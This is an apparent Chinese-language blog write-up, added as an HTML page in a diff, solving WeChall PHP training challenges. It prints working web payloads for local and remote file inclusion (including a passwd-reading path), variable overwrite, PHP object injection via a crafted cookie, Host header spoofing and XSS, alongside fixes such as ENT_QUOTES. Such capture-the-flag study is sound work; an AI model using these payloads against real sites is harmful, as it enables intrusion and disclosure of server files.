@@ -1,0 +1,934 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./Wechall-PHP-Writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Wechall-PHP-Writeup/screen.css" rel="stylesheet"/>
+<link href="./Wechall-PHP-Writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./Wechall-PHP-Writeup/bendawang.css" rel="stylesheet"/>
+<script src="./Wechall-PHP-Writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./Wechall-PHP-Writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./Wechall-PHP-Writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="wechallphpwriteup">Wechall PHP Writeup</h1>
+<p style="max-width:100%;height:auto;">（吐槽一下：Wechall的题解好难找啊。。。）
+有一些PHP的题目在MYSQL里面就已经做过了，所以这里题解就不再写了，想看的可以去看看我写的Mysql的Writeup。<code style="max-width:100%;height:auto;">http://blog.csdn.net/qq_19876131/article/details/50594894</code></p>
+<p style="max-width:100%;height:auto;">Wechall PHP系列题目链接：<code style="max-width:100%;height:auto;">http://www.wechall.net/challs/PHP/by/chall_score/ASC/page-1</code></p>
+<h2 id="1trainingphplfi">1、Training: PHP LFI</h2>
+<p style="max-width:100%;height:auto;">一道本地文件包含题目，不用看源代码，主要代码它已经贴出来了：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$filename = &amp;apos;pages/&amp;apos;.(isset($_GET["file"])?$_GET["file"]:"welcome").&amp;apos;.html&amp;apos;;
+include $filename;
+</code></pre>
+<p style="max-width:100%;height:auto;">一道有限制的本地文件包含，直接考虑%00截断，它有提示说是要访问一个../solution.php，所以开始直接尝试</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?file=../solution.php%00
+</code></pre>
+<p style="max-width:100%;height:auto;">结果却是如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002156661" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">没有这个文件，那么在往上一级访问，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?file=../../solution.php%00
+</code></pre>
+<p style="max-width:100%;height:auto;">成功！</p>
+<p style="max-width:100%;height:auto;">这里简单贴一下自己总结的几种文件包含的绕过：具体的以后再写个博客吧，贴个比较详细链接：http://drops.wooyun.org/tips/3827（这篇文章刚开始挺详细的，越往后越简略。。。）</p>
+<h3 id="2100magic_quote_gpcoff">2.1 %00 截断（Magic<em>quote</em>gpc为off的情况下）</h3>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://127.0.0.1/include.php?dir=shell.txt%00
+</code></pre>
+<h3 id="22">2.2 使用？截断（用于远程文件包含）</h3>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://127.0.0.1/include.php?dir=http://127.0.0.1/shell.txt?
+http://127.0.0.1/include.php?dir=http://127.0.0.1/shell.txt%23
+</code></pre>
+<h3 id="23">2.3 通过使路径长度达到一定长度限制时截断(均适用)</h3>
+<p style="max-width:100%;height:auto;">通常Windows的截断长度为240，Linux的截断长度为4096。由于Windows和Linux的文件名都有一个最大路径长度(MAX_PATH)的限制，因此当提交文件名的长度超过了最大路劲长度限制是就会截断后面的内容，从而达到文件包含的效果。</p>
+<h3 id="24magic_quote_gpcoffwindowns">2.4 点号截断（当magic<em>quote</em>gpc为off的时候，仅限windowns服务器）</h3>
+<p style="max-width:100%;height:auto;">例子：http://127.0.0.1/include.php?dir=../../../../ect/passwd……………………………………………………………………[很多的.]</p>
+<h2 id="2php0817">2、PHP 0817</h2>
+<p style="max-width:100%;height:auto;">这道题源码先贴一下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+if (isset($_GET[&amp;apos;which&amp;apos;]))
+{
+        $which = $_GET[&amp;apos;which&amp;apos;];
+        switch ($which)        {
+        case 0:
+        case 1:
+        case 2:
+                require_once $which.&amp;apos;.php&amp;apos;;                break;
+        default:
+                echo GWF_HTML::error(&amp;apos;PHP-0817&amp;apos;, &amp;apos;Hacker NoNoNo!&amp;apos;, false);
+                break;
+        }}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">观察一下，发现case0,1都没有给出来，而且也没有别的多余的过滤，它要求的是访问<code style="max-width:100%;height:auto;">solution.php</code>看看源码，好像直接参数值赋为solution就行了，所以尝试</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?which=solution
+</code></pre>
+<p style="max-width:100%;height:auto;">果然直接就成功了。。。</p>
+<h2 id="3trainingregisterglobals">3、Training: Register Globals</h2>
+<p style="max-width:100%;height:auto;">好把这道题犯蠢了，刚开始完全没有看到题目的提示是Register Globals的提示，一开始就盯着源码中的这一块儿一直琢磨：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (isset($_POST[&amp;apos;password&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; is_string($_POST[&amp;apos;password&amp;apos;]) &amp;&amp; is_string($_POST[&amp;apos;username&amp;apos;]) )
+{
+    $uname = mysql_real_escape_string($_POST[&amp;apos;username&amp;apos;]);
+    $pass = md5($_POST[&amp;apos;password&amp;apos;]);
+    $query = "SELECT level FROM ".GWF_TABLE_PREFIX."wc_chall_reg_glob WHERE username=&amp;apos;$uname&amp;apos; AND password=&amp;apos;$pass&amp;apos;";
+    $db = gdo_db();
+    if (false === ($row = $db-&gt;queryFirst($query))) {
+        echo GWF_HTML::error(&amp;apos;Register Globals&amp;apos;, $chall-&gt;lang(&amp;apos;err_failed&amp;apos;));
+    } else {
+        # Login success
+        $login = array($_POST[&amp;apos;username&amp;apos;], (int)$row[&amp;apos;level&amp;apos;]);
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">虽然是<code style="max-width:100%;height:auto;">mysql_real_escape_string()</code>函数，但是数据库没有说是GBK编码的，经过实测，宽字符注入确实不管用，然后我就开始琢磨半天，后来才看到源码上面有这样一句：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;"># EMULATE REGISTER GLOBALS = ON
+foreach ($_GET as $k =&gt; $v) { $$k = $v; }
+</code></pre>
+<p style="max-width:100%;height:auto;">很明显的就是一个变量覆盖的问题，因为这里表明了我们通过get方式传入的参数都会直接被注册成全局变量。
+再看看源码最后的判断部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (isset($login))
+{
+    echo GWF_HTML::message(&amp;apos;Register Globals&amp;apos;, $chall-&gt;lang(&amp;apos;msg_welcome_back&amp;apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
+    if (strtolower($login[0]) === &amp;apos;admin&amp;apos;) {
+        $chall-&gt;onChallengeSolved(GWF_Session::getUserID());
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">问题就简单了，直接覆盖<code style="max-width:100%;height:auto;">$login[0]</code>就可以，</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002219802" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">注意要是用户名和密码不匹配就行了（就是随便乱输），这样子这道题就算搞定了！</p>
+<h2 id="areyouserial">Are you serial</h2>
+<p style="max-width:100%;height:auto;">这道题也是够折腾，刚开始不知道他要我干啥，给了6个源码，以及一个登录的地方</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002230474" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">随便试一下，输入一个serial，结果返回了一个这个东西：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002251224" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">开始看源码：
+<code style="max-width:100%;height:auto;">code.php</code>，几个判断，重要的如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (isset($_POST[&amp;apos;login&amp;apos;]))
+{
+        $form-&gt;execute(Common::getPostString(&amp;apos;username&amp;apos;));
+}
+# Logout all the users
+elseif (isset($_POST[&amp;apos;logout&amp;apos;]))
+{
+        $form_logout-&gt;execute();
+}
+ ### Display
+
+..........中间我就省略了，节约空间
+
+# Logged in user
+if (false !== ($user = unserialize(Common::getCookie(&amp;apos;serial_user&amp;apos;, &amp;apos;&amp;apos;))))
+{
+        # Show welcome screen
+        echo GWF_HTML::message(&amp;apos;Serial Challenger&amp;apos;, $chall-&gt;lang(&amp;apos;msg_wb&amp;apos;, array(htmlspecialchars($user-&gt;getUsername()), $user-&gt;getPassword(), $user-&gt;getUserlevel())));
+                # Show logout form
+        echo $form_logout-&gt;serial_formz()-&gt;templateY($chall-&gt;lang(&amp;apos;ft_logout&amp;apos;));
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">看如果传参有login，那么就调用<code style="max-width:100%;height:auto;">SERIAL_LoginForm</code>类的一个方法，这样子最后userlevel必然就是0，因为最后一个类默认的userlevel值0，那么我们就不能让它正常login，然后发现下面有一个if语句是从cookie中读取<code style="max-width:100%;height:auto;">serial_user</code>,并且看到了关键的一个函数，<code style="max-width:100%;height:auto;">unserialize()</code>方法。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">PS：对于PHP object injection不太熟的可以看看我的另一篇博客专门介绍这个的。
+  http://blog.csdn.net/qq_19876131/article/details/50926210</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">然后来看看这个<code style="max-width:100%;height:auto;">insecure.inc.php</code>源码，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function my_autoloader($classname)
+{
+        chdir(&amp;apos;challenge/are_you_serial&amp;apos;);
+        require_once &amp;apos;./&amp;apos;.str_replace(&amp;apos;.&amp;apos;, &amp;apos;&amp;apos;, $classname).&amp;apos;.php&amp;apos;;        chdir(&amp;apos;../../&amp;apos;);
+}
+spl_autoload_register(&amp;apos;my_autoloader&amp;apos;);
+</code></pre>
+<p style="max-width:100%;height:auto;">这题的重点就在于 <code style="max-width:100%;height:auto;">spl_autoload_register</code> 这个函数，解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到<code style="max-width:100%;height:auto;">( sql_autoload_register(xxx) ) xxx</code>函数中，这里是要访问<code style="max-width:100%;height:auto;">SERIAL_Solution.php</code>就算成功了。
+即我们的类名一定要是<code style="max-width:100%;height:auto;">SERIAL_Solution</code>，即反序列化之后传入<code style="max-width:100%;height:auto;">my_autoloader</code>函数中的参数才会是SERIAL_Solution，这样才能访问<code style="max-width:100%;height:auto;">SERIAL_Solution.php</code>，所以问题就简单了，
+根据下述代码产生的payload，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+final class SERIAL_Solution
+{
+        public $username = &amp;apos;&amp;apos;;
+        public $password = &amp;apos;&amp;apos;;        
+        public $userlevel = 0;
+}
+$a = new SERIAL_Solution();
+$a-&gt;username=&amp;apos;serial&amp;apos;;
+$a-&gt;password=&amp;apos;testtest&amp;apos;;
+$a-&gt;userlevel=100;
+
+echo serialize($a);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">输出为：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">O:15:"SERIAL_Solution":3:{s:8:"username";s:6:"serial";s:8:"password";s:8:"testtest";s:9:"userlevel";i:100;}
+</code></pre>
+<p style="max-width:100%;height:auto;">根据最开始的分析，我们要修改cookie使得，<code style="max-width:100%;height:auto;">serial_user</code>的值为上述值的URL编码并且把参数中的<code style="max-width:100%;height:auto;">login</code>删掉，这样就算注入成功了。
+抓包并修改的截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002320256" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后就成功了：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002329943" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这道题好吧这道题花了我好久好久才搞出来，还是太菜了，要是有Writeup就不会这样了，所以我才打算写个WP，方便自己也方便别人吧。</p>
+<h2 id="php0819">PHP 0819</h2>
+<p style="max-width:100%;height:auto;">好吧，这道题是问了别人的，涨姿势了，第一次知道php还有这鬼东西….<code style="max-width:100%;height:auto;">heredoc</code>
+简单介绍下<code style="max-width:100%;height:auto;">heredoc</code>吧，这里先贴个链接http://www.cnblogs.com/igoogleyou/p/heredoc.html</p>
+<p style="max-width:100%;height:auto;">php 中的 heredoc技术是php用来引用字符串的一种方式。在phpwind中巧妙的运用了这个技术，实现了逻辑代码和界面设计的分离。
+语法：  </p>
+<ol>
+<li>使用操作符  “&lt;&lt;&lt;”</li>
+<li>操作符后紧跟标识符（开始标识符），之后重起新的一行 输入要引用的字符串，可以包含变量。</li>
+<li>新的一行，顶格写结束表示符，以分号结束。
+例如</li>
+</ol>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+$str = &lt;&lt;&lt;s
+heredoc!
+s;
+
+echo $str;
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">在上述例子中，<code style="max-width:100%;height:auto;">$str</code>的值就是heredoc，即我的标志符就是<code style="max-width:100%;height:auto;">s</code>。</p>
+<p style="max-width:100%;height:auto;">那么这里就简单了，我只需要让eval为1337就行了，构造payload如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?eval=&lt;&lt;&lt;s%0a1337%0as;%0a
+</code></pre>
+<p style="max-width:100%;height:auto;">这里注意最后的换行符，因为我们使用的这个<code style="max-width:100%;height:auto;">heredoc</code>，加上eval，那么一定要在最后加上换行符，这里卡了我好久好久。。。卡的我连妈都不认识了。。。。。</p>
+<h2 id="hostme">HOST me</h2>
+<p style="max-width:100%;height:auto;">这道题给出的代码很简单，<code style="max-width:100%;height:auto;">·$_SERVER[&amp;apos;HTTP_HOST&amp;apos;]</code> 是从http头的Host读的，所以很明显是要改<code style="max-width:100%;height:auto;">http header</code>的，用<code style="max-width:100%;height:auto;">burp suite</code>抓包吧，然后把HOST改成<code style="max-width:100%;height:auto;">localhost</code></p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210102147" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">好吧，果然没有这么简单</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210119162" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">看到了一个wrong vhost，这个就蛋疼了，第一次还是在很早之前的，当时完全不知道怎么搞，后来之前简单学习过配置litespeed的虚拟主机才有了些基本的印象。
+这里它说wrong vhost，错误的虚拟主机，那么很有可能就是他这台虚拟主机的名称也叫<code style="max-width:100%;height:auto;">localhost</code>，因为请求头的<code style="max-width:100%;height:auto;">HOST</code>参数已经被改成了<code style="max-width:100%;height:auto;">localhost</code>，然后当我们访问的时候就访问到这台机器上去了，而不是我们题目的机器，而这时候也不用想别的，直接把GET上的URL补全就行了，补全成</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">GET www.wechall.net/challenge/space/host_me/index.php HTTP/1.1
+Host: localhost
+.......//其他的请求头参数,不罗列了
+</code></pre>
+<p style="max-width:100%;height:auto;">这样子就成功了，还有，一定要下拉一下页面才能够看到成功的信息，当时没看到成功，又浪费了大把时间。。。报警了。。</p>
+<h2 id="php0815">PHP 0815</h2>
+<p style="max-width:100%;height:auto;">这道题感觉怪怪的。。。
+先贴源码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?
+# Only allow these ID&amp;apos;s
+$whitelist = array(1, 2, 3);
+
+# if show is not set die with error.if (false === ($show = isset($_GET[&amp;apos;show&amp;apos;]) ? $_GET[&amp;apos;show&amp;apos;] : false)) {
+        die(&amp;apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&amp;apos;);
+}
+# check if get var is sane (is it in whitelist ?)
+elseif (in_array($show, $whitelist)){
+        $query = "SELECT 1 FROM `table` WHERE `id`=$show";
+        echo &amp;apos;Query: &amp;apos;.htmlspecialchars($query, ENT_QUOTES).&amp;apos;&lt;br/&gt;&amp;apos;;
+        die(&amp;apos;SHOWING NUMBER &amp;apos;.htmlspecialchars($show, ENT_QUOTES));
+}else # Not in whitelist !
+{
+        die(&amp;apos;HACKER NONONO&amp;apos;);
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">说是这里可能存在SQL注入，找一下修复方法，一脸懵逼好吧。修复方法我要杂提交啊？
+先看看把，这里问题关键在于这个部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">elseif (in_array($show, $whitelist)){
+    ......
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这个<code style="max-width:100%;height:auto;">in_array()</code>函数和我们的<code style="max-width:100%;height:auto;">intval()</code>之类的一样，就拿这里来说吧。
+我们举个例子，看看下面的代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$whitelist = array(1, 2, 3);
+$show =&amp;apos;2 or 1=1#&amp;apos;;
+if (in_array($show, $whitelist)){
+    echo "success!";
+}
+else{
+    echo "hack failed!";
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">输入结果是<code style="max-width:100%;height:auto;">success!</code>，所以SQL注入漏洞就在这里，他要的是1到3的数，我们可以直接加上一个强制类型转换就行了啊，比如判断的时候加上一个<code style="max-width:100%;height:auto;">intval()</code>函数，对输入进行强制类型转换成整形就避免了这个漏洞。
+然后我该怎么提交答案。。。。
+我交了一个<code style="max-width:100%;height:auto;">intval()</code>
+结果网站返回了这个：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210223244" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">一脸懵逼好吧，还能更短些。。。。。
+后来想到了试试<code style="max-width:100%;height:auto;">(int)</code>，结果又得到了这个：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210249476" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">日了狗了，它说结果就两个字母，哎，懵逼了，想不动了。。。
+要是哪位大神知道正确答案，求指教。。</p>
+<h2 id="php0818">PHP 0818</h2>
+<p style="max-width:100%;height:auto;">拿到源码，贴一下主要的函数：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function noother_says_correct($number)
+{
+    $one = ord(&amp;apos;1&amp;apos;);
+    $nine = ord(&amp;apos;9&amp;apos;);
+    # Check all the input characters!
+    for ($i = 0; $i &lt; strlen($number); $i++)
+    {
+        # Disallow all the digits!
+        $digit = ord($number{$i});
+        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
+        {
+            # Aha, digit not allowed!
+            return false;
+        }
+    }
+
+    # Allow the magic number ...
+    return $number == "3735929054";
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这道题直接16进制就行了，3735929054的16进制是<code style="max-width:100%;height:auto;">0xdeadc0de</code>,直接提交就行了。</p>
+<h2 id="htmlspecialchars">htmlspecialchars</h2>
+<p style="max-width:100%;height:auto;">这是一道XSS题目，题目吹了一长串逼，然后让你找出漏洞在哪儿然后提交一个解决方案，
+过滤如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">echo "&lt;a href=&amp;apos;http://".htmlspecialchars(Common::getPost(&amp;apos;input&amp;apos;))."&amp;apos;&gt;Exploit Me&lt;/a&gt;";
+</code></pre>
+<p style="max-width:100%;height:auto;">测试的总感觉他的环境好像有点问题，不稳定，本地简单搭一个。如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+if(isset($_GET[&amp;apos;in&amp;apos;]))
+{
+    $a=$_GET[&amp;apos;in&amp;apos;];
+    echo "&lt;a href=&amp;apos;http://".htmlspecialchars($a)."&amp;apos;&gt;Exploit Me&lt;/a&gt;";
+    echo htmlspecialchars("&lt;a href=&amp;apos;http://".htmlspecialchars($a)."&amp;apos;&gt;Exploit Me&lt;/a&gt;");
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">这个其实比较简单，因为单纯的htmlspecialchars()不加参数只会将双引号实体化，这里只需要单引号即可，例如下述代码就可以，</p>
+<pre><code style="max-width:100%;height:auto;">&amp;apos; onmouseover= &amp;apos;alert(1)
+</code></pre>
+<p style="max-width:100%;height:auto;">所以问题就在于单引号没有被过滤，那么修改方案也简单，
+http://www.w3school.com.cn/php/func<em>string</em>htmlspecialchars.asp
+这一页有详细的介绍：</p>
+<pre><code style="max-width:100%;height:auto;">ENT_COMPAT - 默认。仅编码双引号。
+ENT_QUOTES - 编码双引号和单引号。
+ENT_NOQUOTES - 不编码任何引号。
+</code></pre>
+<p style="max-width:100%;height:auto;">所以我们只需要在其中加入参数即可，所以最后答案就是：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">echo "&lt;a href=&amp;apos;http://".htmlspecialchars(Common::getPost(&amp;apos;input&amp;apos;),ENT_QUOTES)."&amp;apos;&gt;Exploit Me&lt;/a&gt;";
+</code></pre>
+<h2 id="php0816">PHP 0816</h2>
+<p style="max-width:100%;height:auto;">直接贴看主要代码把：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">foreach ($_GET as $key =&gt; $value){
+        if ($key === &amp;apos;src&amp;apos;) {
+                    php0816SetSourceFile($value);
+        }
+        elseif ($key === &amp;apos;mode&amp;apos;) {                
+                php0816execute($value);
+        }
+        elseif ($key === &amp;apos;hl&amp;apos;) {
+                php0816addHighlights($value);
+        }}
+</code></pre>
+<p style="max-width:100%;height:auto;">他给了几个样例网页说明了这个功能，主要就是几个参数，<code style="max-width:100%;height:auto;">src</code>，<code style="max-width:100%;height:auto;">hl</code>，<code style="max-width:100%;height:auto;">mode</code>，然后就是上述代码，它是按顺序读取参数值的，</p>
+<ul>
+<li><code style="max-width:100%;height:auto;">php0816SetSourceFile</code>主要是设置显示源码的文件名，有一个白名单过滤，它会读取<code style="max-width:100%;height:auto;">src</code>，</li>
+<li>然后是<code style="max-width:100%;height:auto;">php0816execute</code>高亮显示的执行程序，这里它要求是<code style="max-width:100%;height:auto;">hl</code>参数不为空，</li>
+<li>然后就是<code style="max-width:100%;height:auto;">php0816addHighlights</code>，问题就在这里，我们看看这个函数漏洞部分的源码</li>
+</ul>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function php0816Highlighter(){
+        ......
+        ......
+        $filename = str_replace(array(&amp;apos;/&amp;apos;, &amp;apos;\\&amp;apos;, &amp;apos;..&amp;apos;), &amp;apos;&amp;apos;, Common::getGet(&amp;apos;src&amp;apos;));#        
+        ......
+        ......
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这里又一次从GET参数里面获取src的值，而之前那个<code style="max-width:100%;height:auto;">php0816SetSourceFile</code>也是这样获取然后进行过滤，根据最开始对GET参数的顺序的读取，那么我们只需要先让它进入到<code style="max-width:100%;height:auto;">php0816Highlighter</code>这里就直接获取<code style="max-width:100%;height:auto;">src</code>而不会被<code style="max-width:100%;height:auto;">php0816SetSourceFile</code>所过滤了。so，简单说就是改一下参数顺序就可以，payload如下：</p>
+<pre><code class="vbscript-html language-vbscript-html" style="max-width:100%;height:auto;">http://www.wechall.net/challenge/php0816/code.php?hl[0]=123&amp;mode=hl&amp;src=solution.php
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们就拿到了Answer如下图</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210314679" style="max-width:100%;height:auto;"/><br/></p>
+<blockquote>
+<p style="max-width:100%;height:auto;">答案就是AnotherCodeflowMistake</p>
+</blockquote>
+<h2 id="yourselfphp">Yourself PHP</h2>
+<p style="max-width:100%;height:auto;">一道XSS的题目，先贴源码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">..........
+if (isset($_POST[&amp;apos;username&amp;apos;])){
+        echo GWF_Box::box(sprintf("Well done %s, you entered your username. But this is &lt;b&gt;not&lt;/b&gt; what you need to do.", htmlspecialchars(Common::getPostString(&amp;apos;username&amp;apos;))));
+}
+..........
+echo sprintf(&amp;apos;&lt;form action="%s" method="post"&gt;&amp;apos;, $_SERVER[&amp;apos;PHP_SELF&amp;apos;]).PHP_EOL;
+..........
+</code></pre>
+<p style="max-width:100%;height:auto;">这里折腾了一会儿<code style="max-width:100%;height:auto;">username</code>的输入，后来确实是认为那个是XSS不进去的，然后再看看代码，看到了一个比较关键的东西，<code style="max-width:100%;height:auto;">$_SERVER[&amp;apos;PHP_SELF&amp;apos;]</code>，好的，XSS点就在这里了。
+<code style="max-width:100%;height:auto;">$_SERVER[&amp;apos;PHP_SELF&amp;apos;]</code>表示当前执行脚本的文件名，比如下述代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+echo $_SERVER[&amp;apos;PHP_SELF&amp;apos;];
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">我把它放在<code style="max-width:100%;height:auto;">127.0.0.1/index.php</code>下面，那么输入结果就是</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">/index.php
+</code></pre>
+<p style="max-width:100%;height:auto;">这个东西常常用于表单提交给本页面。
+这里我们直接在URL后面附上XSS代码，网站用<code style="max-width:100%;height:auto;">$_SERVER[&amp;apos;PHP_SELF&amp;apos;]</code>直接放进了form标签，那我们可以构造payload如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">https://www.wechall.net/challenge/yourself_php/index.php/"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">先封闭之前的form标签在自己构建一个新的标签造成XSS。</p>
+<h2 id="crappyshare">Crappyshare</h2>
+<p style="max-width:100%;height:auto;">同样是一道本地文件包含的题目，因为在URL上传时除了简单的正则匹配时并没有别的过滤，要读取本地的<code style="max-width:100%;height:auto;">solution.php</code>文件，那么我们可以这样构造</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">file://solution.php
+</code></pre>
+<p style="max-width:100%;height:auto;">直接将上述语句输入到URL框即可。意思就是打印本地的solution.php文件。
+别的就不多说了。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./Wechall-PHP-Writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
